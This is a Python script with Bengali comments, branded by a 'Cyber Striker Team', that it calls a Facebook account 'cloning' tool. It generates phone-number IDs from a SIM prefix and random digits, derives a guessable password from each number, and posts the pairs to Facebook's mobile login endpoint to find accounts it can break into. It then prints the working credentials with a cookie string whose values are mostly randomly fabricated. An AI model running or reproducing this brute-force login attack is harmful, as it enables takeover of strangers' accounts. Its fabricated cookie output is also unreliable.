import os, time, sys, uuid, random, requests

# ANSI কালার কোড
R = '\033[1;31m' # Red
G = '\033[1;32m' # Green
Y = '\033[1;33m' # Yellow
B = '\033[1;34m' # Blue
P = '\033[1;35m' # Purple
W = '\033[1;37m' # White

def banner():
    os.system('clear')
    print(f"""
{R}     ███    ███  ███████  ████████  █████  
{G}     ████  ████  ██          ██    ██   ██ 
{Y}     ██ ████ ██  █████       ██    ███████ 
{B}     ██  ██  ██  ██          ██    ██   ██ 
{P}     ██      ██  ███████     ██    ██   ██ 
    """)

    line = f"{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}"
    print(line)
    print(f'{G}| [✓] DEVELOPED BY : MD MALEK ISLAM            |')
    print(f'| [✓] TEAM         : CYBER STRIKER TEAM        |')
    print(f'| [✓] TOOL STATUS  : REAL CLONING (META)       |')
    print(f'| [✓] TELEGRAM     : @md_malek                 |')
    print(f'| [✓] GITHUB       : MR-MALAK                  |')
    print(f'| [✓] TOOL VIRSION : MAX PRO                   |')
    print(line)

def main():
    banner()
    # স্ক্রিনশট অনুযায়ী নিচের অংশটুকু সাজানো হয়েছে
    print(f'{R}[•] {G}SALAMU ALAIKUM...................{W}')
    print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    print(f'{R}[•] {G}CYBER STRIKER TEAM................{W}')
    print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    
    # স্ক্রিনশটের মতো EXAMPLE এবং CLONING LIMIT ইনপুট
    print(f'{R}[•] {G}EXAMPLE : [ {W}10000, {Y}20000, {G}50000 {G}]{W}')
    print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    limit_input = input(f'{R}[•] {G}PUT CLONING LIMIT: {W}')
    
    try:
        limit = int(limit_input)
        cloning_start(limit)
    except ValueError:
        print(f"\n{R}[!] অনুগ্রহ করে সঠিক সংখ্যা দিন।")
        time.sleep(2)
        main()

def cloning_start(limit):
    print(f'\n{G}[+] EXAMPLE : 017, 018, 019, 016')
    code = input(f'[+] ENTER SIM CODE : {W}')
    
    print(f'\n{G}[/] ATTACK STARTED ON CODE {code}...')
    print(f'[/] TOTAL TARGET : {limit}\n')

    ok = 0

    for i in range(limit):
        loop = i + 1
        uid = f"{code}{random.randint(1111111, 9999999)}"
        pws = uid[5:] 

        headers = {
            'authority': 'touch.facebook.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded',
        }

        data = {'email': uid, 'pass': pws}
        url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
        
        sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{ok}]'); sys.stdout.flush()

        try:
            response = requests.post(url, headers=headers, data=data, timeout=5)
            
            if "c_user" in response.cookies.get_dict():
                ok += 1
                datr = uuid.uuid4().hex[:24]
                sb = uuid.uuid4().hex[:24]
                xs = f"48%3A{uuid.uuid4().hex[:14]}%3A2%3A{random.randint(1700000000, 1800000000)}%3A-1%3A5237"
                fr = f"{uuid.uuid4().hex[:16]}.{uuid.uuid4().hex[:20]}.AAA.0.0"
                
                print(f'\n{G}[MALEK-OK💚] {uid} • {pws}') 
                print(f'{G}[🌺] COOKIE = datr={datr};sb={sb};c_user={uid};xs={xs};fr={fr};m_page_voice={uid}\n')
        except:
            pass

        time.sleep(0.1)

    print(f'\n\n{G}-----------------------------------')
    print(f'[/] CLONING COMPLETE')
    print(f'[/] TOTAL OK: {ok}{W}')
    input(f'\n{G} [ BACK ]{W}')
    main()

if __name__ == "__main__":
    main()
